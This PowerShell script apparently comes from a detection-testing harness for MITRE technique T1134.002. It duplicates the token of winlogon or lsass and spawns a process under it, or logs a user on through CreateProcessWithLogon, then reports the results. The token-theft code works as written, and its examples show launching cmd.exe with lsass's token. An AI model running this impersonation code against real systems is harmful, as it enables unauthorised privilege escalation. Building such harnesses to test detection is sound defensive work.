if (-not ('AtomicTestHarnesses_T1134_002.ProcessNativeMethods' -as [Type])) {
    $TypeDef = @'
using System;
using System.Runtime.InteropServices;
namespace AtomicTestHarnesses_T1134_002 {
    [Flags]
    public enum ProcessAccess {
        AllAccess = 0x001FFFFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }

    [Flags]
    public enum TokenAccess { 
        StandardRequiredRights = 0x000F0000,
        StandardRead = 0x00020000,
        TokenAssignPrimary = 0x0001,
        TokenDuplicate = 0x0002,
        TokenImpersonate = 0x0004,
        TokenQuery = 0x0008,
        TokenQuerySource = 0x0010,
        TokenAdjustPrivileges = 0x0020, 
        TokenAdjustGroups = 0x0040,
        TokenAdjustDefault = 0x0080,
        TokenAdjustSessionId = 0x0100,
        AllAccess = (StandardRequiredRights | TokenAssignPrimary | TokenDuplicate | TokenImpersonate | TokenQuery | TokenQuerySource | TokenAdjustPrivileges | TokenAdjustGroups | TokenAdjustDefault)
    }

    [Flags]
    public enum CreationFlags
    {
        CREATE_NO_WINDOW = 0x08000000
    }

    [Flags]
    public enum LogonFlags
    {
        LOGON_WITH_PROFILE     = 0x00000001,
        LOGON_NETCREDENTIALS_ONLY  = 0x00000002 
           
    }

    public enum SECURITY_IMPERSONATION_LEVEL {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }

    [Flags]
    public enum TOKEN_TYPE {
        TokenPrimary = 1,
        TokenImpersonation = 2
    }

    public struct STARTUPINFO {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }


    public struct STARTUPINFOEX {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    public struct PROCESS_INFORMATION  {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    public class ProcessNativeMethods {

         [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            ProcessAccess processAccess,
            bool bInheritHandle,
            int processId);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            TokenAccess DesiredAccess, 
            ref IntPtr TokenHandle);

        [DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
        public extern static bool DuplicateTokenEx(
            IntPtr hExistingToken,
            TokenAccess dwDesiredAccess,
            IntPtr lpTokenAttributes,
            SECURITY_IMPERSONATION_LEVEL SECURITY_IMPERSONATION_LEVEL, 
            TOKEN_TYPE TokenType,
            out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern bool CreateProcessWithToken(
            IntPtr hToken,
            LogonFlags logonFlags,
            IntPtr applicationName,
            string commandline,
            CreationFlags creationFlags,
            IntPtr environment,
            string currentDirectory,
            [In] ref STARTUPINFOEX startupInfo,
            out PROCESS_INFORMATION processInformation);  

        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern bool CreateProcessWithLogon(
            string lpszUsername,
            string lpszDomain,
            string lpszPassword,
            LogonFlags logonFlags,
            IntPtr lpApplicationName, 
            string lpCommandLine,
            CreationFlags creationFlags,
            IntPtr environment,
            IntPtr currentDirectory,
            [In] ref STARTUPINFOEX startupInfo,
            out PROCESS_INFORMATION processInformation); 

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool CloseHandle(
            IntPtr hHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool RevertToSelf();
    
    }
}
'@
Add-Type -TypeDefinition $TypeDef
}
function Invoke-ATHCreateProcessWithToken {
    <#
    .SYNOPSIS

    Test runner for access token manipulation via create process with token.
    
    Technique ID: T1134.002 (Create Process with Token)

    .DESCRIPTION

    Invoke-ATHCreateProcessWithToken was designed to simulate token impersonation by creating a new primary token via duplication and creating a new process with the new token or by logging in a user and using the newly logged on user's access token. 

    .PARAMETER TargetProcessId

    Specifies the process id of the target process. This allows the user to choose a process that is running under any security context and attempt impersonation. 

    .PARAMETER ProcessCommandline

    Specifies the process command-line the user wants to create.

    .PARAMETER AccessRights

    Specifies the access rights (QueryLimitedInformation, QueryInformation, AllAccess) the user wants to request when opening a handle to the target process.

    .PARAMETER Credential
    
    Specifies the credential the user wants to pass through to the LogonUser API. 

    .PARAMETER LogonFlag
    
    Specifies the logon type for the target user. Options NewCredentials and Interactive are available. 

    .PARAMETER CreateProcessVariant
    
    Specifies which Win32 API to use. Either CreateProcessWithToken or CreateProcessWithLogon. 

    .PARAMETER TestGuid
    
    Optionally, specify a test GUID value to use to override the generated test GUID behavior. 

    .INPUTS

    System.Diagnostics.Process

    Invoke-ATHCreateProcessWithToken accepts the output of Get-Process. Only one Process object should be supplied to Invoke-ATHCreateProcessWithToken.

    Microsoft.Management.Infrastructure.CimInstance#root/cimv2/Win32_Process

    Invoke-ATHCreateProcessWithToken accepts the output of a Win32_Process WMI object via Get-CimInstance.


    .OUTPUTS
    PSObject

    Outputs an object consisting of relevant execution details. The following object properties may be populated:
    
    * TechniqueID - Specifies the relevant MITRE ATT&CK Technique ID.
    * TestSuccess - Will be set to True if it was determined that the technique executed successfully. Invoke-ATHCreateProcessWithToken can identify when impersonation was successful by checking the security context of the current thread and confirming it is different then the original security context.
    * TestGuid - Specifies the test GUID that was used for the test.
    * TestCommand - Specifies the command-line arguments used to perform the test.
    * SourceUser - Specifies the user that the current thread is running under before impersonation was performed.
    * SourceExecutableFilePath - Specifies the full path of the source executable. If the source executable is specified as a byte array, this property will be empty.
    * SourceExecutableFileHash - SHA256 hash of the source executable.
    * ImpersonatedUser - Specifies the user account that is being ran in the current thread after impersonation was performed.
    * LogonType - Specifies what type of logon session the target user was signed in under. Null if target user wasn't signed in. 
    * SourceProcessId - Specifies the process ID of the process performing impersonation.
    * GrantedRights - The process rights used to request a handle to the target process. 
    * TargetExecutablePath - Specifies the full path of the target executable.
    * TargetExecutableFileHash - SHA256 hash of the target executable.
    * NewProcessExecutablePath - Specifies the full path of the newly created proccess.
    * NewProcessCommandline - Specifies the process command-line of the newly created process.
    * NewProcessExecutableHash - SHA256 hash of the new process executable.
    * NewProcessId - Specifies the process ID of the newly created process.

    .EXAMPLE

    Invoke-ATHCreateProcessWithToken

    .EXAMPLE

    Get-Process -name lsass | Invoke-ATHCreateProcessWithToken

    Will perform impersonation by duplicating the lsass.exe token, creating a new primary, then creating a new calc.exe process.

    .EXAMPLE

    Invoke-ATHCreateProcessWithToken -AccessRights AllAccess

    Will perform impersonation by obtaining a handle to the winlogon.exe process with AllAccess as the requested rights, duplicates winlogon token, creating a new primary, then creating a new calc.exe process.


    .EXAMPLE 

    Get-Process -name lsass | Invoke-ATHCreateProcessWithToken -ProcessCommandline 'C:\Windows\System32\cmd.exe' -AccessRights AllAccess

    Will perform impersonation by obtaining a handle to the winlogon.exe process with AllAccess as the requested rights, duplicates lsass token, creating a new primary, then creating a new cmd.exe process..

    .EXAMPLE 

    Get-Process -name lsass | Invoke-ATHCreateProcessWithToken  -CreateProcessVariant WithToken -ProcessCommandline 'C:\Windows\System32\cmd.exe' -AccessRights AllAccess

    Will perform impersonation by obtaining a handle to the winlogon.exe process with AllAccess as the requested rights, duplicates lsass token, creating a new primary, then creating a new cmd.exe process.

    .EXAMPLE 
     
    $cred = Get-Credential
    Invoke-ATHCreateProcessWithToken -CreateProcessVariant WithLogon -LogonFlag Interactive -Credential $cred

    Logs in a user with legitimate credentials under an Interactive Logon (Type 2), then impersonates the logged on user. 
    
    .EXAMPLE 
     
    $cred = Get-Credential
    Invoke-ATHCreateProcessWithToken -Credential $cred 

    Logs in a user with legitimate credentials under an Interactive Logon (Type 2), then impersonates the logged on user. 

    .EXAMPLE 
     
    $cred = Get-Credential
    Invoke-ATHCreateProcessWithToken -Credential $cred -LogonFlag NewCredentials

    Logs in a user with legitimate credentials under a NewCredentials Logon (Type 9), then impersonates the logged on user. 

    #>

    [CmdletBinding()]
    param (
        [Parameter(ValueFromPipelineByPropertyName)]
        [Int32]
        [Alias('Id')] #Supports pipelineing with Get-Process
        [Alias('ProcessId')] #Supports pipelining with Get-CimInstance Win32_Process
        $TargetProcessId = (Get-Process -Name winlogon)[0].Id,

        [Parameter()]
        [string]
        [ValidateNotNullOrEmpty()]
        $ProcessCommandline,
        
        [Parameter()]
        [string]
        [ValidateSet('AllAccess', 'QueryLimitedInformation', 'QueryInformation')]
        $AccessRights = 'QueryLimitedInformation',

        [Parameter()]
        [string]
        [ValidateSet('WithToken', 'WithLogon')]
        $CreateProcessVariant = 'WithToken',

        [Parameter()]
        [string]
        [ValidateSet('Interactive', 'NewCredentials')]
        $LogonFlag = 'Interactive',

        [Parameter(ValueFromPipelineByPropertyName)]
        [System.Management.Automation.PSCredential]
        $Credential,

        [Guid]
        $TestGuid = (New-Guid)
    )

    $SourceProcessPath = $null
    $SourceProcessPath =  (Get-CimInstance -ClassName Win32_Process -Property ExecutablePath  -Filter "ProcessId=$PID").Path
    $SourceUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

    if ($ProcessCommandline) {
        $TargetProcessCommandline = $ProcessCommandline
    } else {
        $TargetProcessCommandline = "powershell.exe -nop -Command Write-Host $TestGuid; Start-Sleep -Seconds 2; exit"
    }

    $ProcessInfo =   New-Object -TypeName AtomicTestHarnesses_T1134_002.PROCESS_INFORMATION
    $StartupInfo =   New-Object -TypeName AtomicTestHarnesses_T1134_002.STARTUPINFO
    $StartupInfoEx = New-Object -TypeName AtomicTestHarnesses_T1134_002.STARTUPINFOEX
    $StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][AtomicTestHarnesses_T1134_002.STARTUPINFOEX])
    $StartupInfoEx.StartupInfo = $StartupInfo

    $Directory = $PWD.Path 

    if ($Credential -ne $null){
        $CreateProcessVariant = 'WithLogon'
    }

    if ($CreateProcessVariant -eq 'WithLogon'){
        if ($Credential -eq $null){
            Write-Error "Must have Credential Flag"
            return
        }
        else{
        $Rights = $null

        $split = $Credential.UserName.Split("\")
        if ($split.Count -eq 2){
            $Domain = $split[0]
            $AccountName = $split[1]
        }
        else {
            $AccountName = $split[0]
            $Domain = $env:COMPUTERNAME
        }
    
        $LogonCreds = [System.Net.NetworkCredential]::new("", $Credential.Password).Password


        if ($LogonFlag -eq 'Interactive') { 
            $LogonFlagName = 'LOGON_WITH_PROFILE'
        }
        else {
            $LogonFlagName = 'LOGON_NETCREDENTIALS_ONLY'
        }

        $LogonTypeCount =  (Get-CimInstance Win32_LogonSession -Filter 'LogonType = 9' | Measure-Object).Count

        $Success = [AtomicTestHarnesses_T1134_002.ProcessNativeMethods]::CreateProcessWithLogon(
            $AccountName,
            $Domain,
            $LogonCreds,
            $LogonFlagName, 
            [IntPtr]::Zero,
            $TargetProcessCommandline,
            'CREATE_NO_WINDOW',
            [IntPtr]::Zero,
            [IntPtr]::Zero,
            [ref] $StartupInfoEx,
            [ref] $ProcessInfo
        );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

        if($Success -eq 0){
            Write-Error $LastError
            return
        }

        $NewProcessId = $ProcessInfo.dwProcessId
        $TargetProcess = Get-WmiObject Win32_Process -Filter "ProcessId=$NewProcessId" | Select Name, @{Name="UserName";Expression={$_.GetOwner().Domain+"\"+$_.GetOwner().User}}

        if ($LogonFlagName -eq 'LOGON_NETCREDENTIALS_ONLY'){
            $LogonTypeCountUpdate =  (Get-CimInstance Win32_LogonSession -Filter 'LogonType = 9' | Measure-Object).Count
            $TargetUser = $Credential.UserName
            $TestSuccess = $null
        
            if($LogonTypeCount -ne $LogonTypeCountUpdate){
                    $TestSuccess = $true
            }
        }

        else {
            $TargetUser = $TargetProcess.UserName
            $TestSuccess = $null

            if(($null -ne $SourceUser) -and ($null -ne $TargetUser) -and ($SourceUser -ne $TargetUser)){
                $TestSuccess = $true
            }
        }

        $TargetExecutablePath = $null
        $ResolvedTargetProcessId = $null
        $TestCommand = $MyInvocation
        $TargetExeHash = $null
        $ResolvedLogonFlag = $LogonFlag
        }
    }

    else {
        $IsAdministrator = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
        if ($IsAdministrator -eq $False){
            Write-Error "Insufficent privileges to perform operation. Please run as Administrator." #The privileges you need to perform CreateProcessWithToken is SeImpersonatePrivilege. Easiest way to obtain this is to be apart of the Administrators group. 
            return
        }

        $ProcessHandle = [AtomicTestHarnesses_T1134_002.ProcessNativeMethods]::OpenProcess(
            $AccessRights, 
            $False,
            $TargetProcessId
        );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

        if($ProcessHandle -eq [IntPtr]::Zero){
            Write-Error $LastError
            return
        }

        $TokenHandle = [IntPtr]::Zero
        $TokenResult = [AtomicTestHarnesses_T1134_002.ProcessNativeMethods]::OpenProcessToken(
            $ProcessHandle,
            'TokenDuplicate',
            [Ref] $TokenHandle
        );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

        if($TokenResult -eq 0){
            Write-Error $LastError

            $null = [AtomicTestHarnesses_T1134_002.ProcessNativeMethods]::CloseHandle($ProcessHandle)

            return
        }

        $DupToken = [IntPtr]::Zero

        $DuplicateToken = [AtomicTestHarnesses_T1134_002.ProcessNativeMethods]::DuplicateTokenEx(
            $TokenHandle,
            'TokenQuery, TokenDuplicate, TokenAssignPrimary, TokenAdjustDefault, TokenAdjustSessionId',
            [IntPtr]::Zero,
            'SecurityImpersonation',
            1, # TokenPrimary
            [ref]$DupToken
        );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

        if($DuplicateToken -eq 0)
        {
            Write-Error $LastError

            $null = [AtomicTestHarnesses_T1134_002.ProcessNativeMethods]::CloseHandle($ProcessHandle)
            $null = [AtomicTestHarnesses_T1134_002.ProcessNativeMethods]::CloseHandle($TokenHandle)

            return
        }

    
        $Success = [AtomicTestHarnesses_T1134_002.ProcessNativeMethods]::CreateProcessWithToken(
            $DupToken,
            'LOGON_WITH_PROFILE',
            [IntPtr]::Zero,
            $TargetProcessCommandline,
            'CREATE_NO_WINDOW',
            [IntPtr]::Zero,
            $Directory,
            [ref] $StartupInfoEx,
            [ref] $ProcessInfo
        );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

        
        if($Success -eq 0){
            Write-Error $LastError

            $null = [AtomicTestHarnesses_T1134_002.ProcessNativeMethods]::CloseHandle($ProcessHandle)
            $null = [AtomicTestHarnesses_T1134_002.ProcessNativeMethods]::CloseHandle($TokenHandle)
            $null = [AtomicTestHarnesses_T1134_002.ProcessNativeMethods]::CloseHandle($DupToken)

            return
        }

        $Rights = $AccessRights

        #Cleanup
        $null = [AtomicTestHarnesses_T1134_002.ProcessNativeMethods]::CloseHandle($ProcessHandle)
        $null = [AtomicTestHarnesses_T1134_002.ProcessNativeMethods]::CloseHandle($TokenHandle)
        $null = [AtomicTestHarnesses_T1134_002.ProcessNativeMethods]::CloseHandle($DupToken)

        #Test logic:
        $NewProcessId = $ProcessInfo.dwProcessId
        $TargetProcess = Get-WmiObject Win32_Process -Filter "ProcessId=$NewProcessId" | Select Name, @{Name="UserName";Expression={$_.GetOwner().Domain+"\"+$_.GetOwner().User}}

        $TargetUser = $TargetProcess.UserName
        $TestSuccess = $null

        if(($null -ne $SourceUser) -and ($null -ne $TargetUser) -and ($SourceUser -ne $TargetUser)){
            $TestSuccess = $true
        }

        $TargetExecutablePath = $null
        $TargetExecutablePath = (Get-CimInstance -ClassName Win32_Process -Property ExecutablePath -Filter "ProcessId=$TargetProcessId").Path
        $TestCommand = $MyInvocation

        #Target Process Hash Logic:
        $SHA256 = [Security.Cryptography.SHA256]::Create()
        $ResolvedTargetFilePath = Resolve-Path -Path $TargetExecutablePath -ErrorAction Stop
        $TargetExeBytes = [IO.File]::ReadAllBytes($ResolvedTargetFilePath.Path)
        $TargetExeHash = ($SHA256.ComputeHash($TargetExeBytes) | ForEach-Object { $_.ToString('X2') }) -join ''

        $ResolvedTargetProcessId = $TargetProcessId
        $ResolvedLogonFlag = $null

    }

    
    $NewProcessExecutablePath = $null
    $NewProcess = Get-CimInstance -ClassName Win32_Process -Property ExecutablePath, CommandLine -Filter "ProcessId=$NewProcessId"
    $NewProcessExecutablePath = $NewProcess.ExecutablePath
    $NewProcessCommandline = $NewProcess.CommandLine
    
    Stop-Process -Id $NewProcessId -Force
 
    #Source Process Hash Logic: 
    $SHA256 = [Security.Cryptography.SHA256]::Create()
    $ResolvedSourceFilePath = Resolve-Path -Path $SourceProcessPath -ErrorAction Stop
    $SourceExeBytes = [IO.File]::ReadAllBytes($ResolvedSourceFilePath.Path)
    $SourceExeHash = ($SHA256.ComputeHash($SourceExeBytes) | ForEach-Object { $_.ToString('X2') }) -join ''

    
    #New Process Hash Logic: 
    $ResolvedNewFilePath = Resolve-Path -Path $NewProcessExecutablePath -ErrorAction Stop
    $NewExeBytes = [IO.File]::ReadAllBytes($ResolvedNewFilePath.Path)
    $NewExeHash = ($SHA256.ComputeHash($NewExeBytes) | ForEach-Object { $_.ToString('X2') }) -join ''

    [PSCustomObject] @{
        TechniqueID                     = 'T1134.002'
        TestSuccess                     = $TestSuccess
        TestGuid                        = $TestGuid
        TestCommand                     = $TestCommand.Line
        SourceUser                      = $SourceUser
        SourceExecutableFilePath        = $SourceProcessPath
        SourceExecutableFileHash        = $SourceExeHash
        SourceProcessId                 = $PID
        GrantedRights                   = $Rights
        ImpersonatedUser                = $TargetUser
        LogonType                       = $ResolvedLogonFlag
        TargetExecutableFilePath        = $TargetExecutablePath
        TargetExecutableFileHash        = $TargetExeHash
        TargetProcessId                 = $ResolvedTargetProcessId
        NewProcessExecutablePath        = $NewProcessExecutablePath
        NewProcessCommandline           = $NewProcessCommandline
        NewProcessExecutableHash        = $NewExeHash
        NewProcessId                    = $NewProcessId
    }

    #Cleanup
    $Revert = [AtomicTestHarnesses_T1134_002.ProcessNativeMethods]::RevertToSelf();$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if($Revert -eq 0){
        Write-Error $LastError
        return
    }


}